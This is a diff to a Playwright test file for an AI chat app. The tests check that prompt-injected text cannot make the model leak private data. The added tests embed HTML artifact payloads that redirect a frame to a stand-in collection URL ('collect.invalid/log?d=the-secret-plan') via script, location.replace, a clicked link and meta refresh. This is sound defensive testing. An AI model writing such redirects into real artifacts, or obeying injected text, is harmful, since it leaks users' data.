@@ -1,10 +1,12 @@
-import { chat, expect, test } from "../fixtures.ts";
+import type { Page } from "@playwright/test";
+import { chat, expect, test, type Fake } from "../fixtures.ts";
 
 /**
  * Text that a page, an email or a file puts in front of the model can tell it to send
- * private data out in an address. These tests check the two ways out that Ponder closes:
- * web_fetch to an address nobody gave (server/search/trusted-pages.ts), and an image in
- * a reply, which the browser would load by itself (the page policy in server/app.ts).
+ * private data out in an address. These tests check the ways out that Ponder closes:
+ * web_fetch to an address nobody gave (server/search/trusted-pages.ts), and what the
+ * browser would load by itself: an image in a reply, and an HTML artifact that sends its
+ * own frame to an address (the page policy in server/app.ts).
  * Addresses end in .invalid, which never resolves, so nothing leaves the machine.
  */
 test.beforeEach(async ({ person, page }) => {
@@ -68,3 +70,48 @@ test("does not load an image from another site in a reply", async ({ page, fake 
 	await blocked;
 	expect(requested).toBe(0);
 });
+
+test("runs an HTML artifact in its frame", async ({ page, fake }) => {
+	await writeHtmlArtifact(page, fake, "Counter", `<p id="out">not yet</p><script>document.getElementById("out").textContent = "script " + "ran"</script>`);
+	await expect(page.frameLocator('iframe[title="Counter"]').getByText("script ran")).toBeVisible();
+});
+
+const SECRET_URL = "https://collect.invalid/log?d=the-secret-plan";
+const navigations = {
+	"a script": `<p>Trip plan</p><script>location.href = "${SECRET_URL}"</script>`,
+	"a script that replaces the page": `<p>Trip plan</p><script>location.replace("${SECRET_URL}")</script>`,
+	"a link that a script clicks": `<a id="go" href="${SECRET_URL}">Trip plan</a><script>document.getElementById("go").click()</script>`,
+	"a meta refresh, with no script": `<meta http-equiv="refresh" content="0;url=${SECRET_URL}"><p>Trip plan</p>`,
+};
+
+for (const [way, content] of Object.entries(navigations)) {
+	test(`an HTML artifact cannot send its frame to another site with ${way}`, async ({ page, fake }) => {
+		const response = await page.request.get("/");
+		expect(response.headers()["content-security-policy"]).toContain("frame-src 'none'");
+
+		let requested = 0;
+		await page.route("https://collect.invalid/**", (route) => {
+			requested++;
+			return route.abort();
+		});
+		const blocked = page.waitForEvent("console", (message) => /collect\.invalid.*frame-src 'none'/.test(message.text()));
+
+		await writeHtmlArtifact(page, fake, "Trip plan", content);
+		await blocked;
+		expect(requested).toBe(0);
+	});
+}
+
+/** A reply that writes an HTML artifact, shown in the side panel as its running page. */
+async function writeHtmlArtifact(page: Page, fake: Fake, title: string, content: string) {
+	await fake.chat({
+		match: `Make ${title}`,
+		steps: [{ toolCalls: [{ name: "write_artifact", input: { id: "page", kind: "html", title, content } }] }, { text: "I wrote it." }],
+	});
+	await chat.send(page, `Make ${title}`);
+	await expect(chat.reply(page)).toContainText("I wrote it.");
+	// On a wide screen the panel opens by itself as the artifact is written. Open it if it did not.
+	const card = page.getByRole("button", { name: `Open ${title}` });
+	if (!(await card.getAttribute("data-open"))) await card.click();
+	await expect(page.locator(`iframe[title="${title}"]`)).toBeVisible();
+}
